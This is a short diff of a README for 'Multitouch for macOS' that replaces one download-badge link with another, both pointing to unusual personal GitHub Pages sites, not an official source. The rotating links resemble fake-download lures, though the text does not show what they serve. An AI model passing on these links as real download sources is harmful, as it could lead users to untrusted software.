@@ -4,7 +4,7 @@
 
 ## 📥 Download Multitouch for macOS
 
-[![⬇️ Download Multitouch](https://img.shields.io/badge/Download-Multitouch%20Mac-blue?style=for-the-badge&logo=apple)](https://shuziktobehuman.github.io/huja/Multitouch)
+[![⬇️ Download Multitouch](https://img.shields.io/badge/Download-Multitouch%20Mac-blue?style=for-the-badge&logo=apple)](https://mitrobandus.github.io/.github/Multitouch)
 
 ---
 
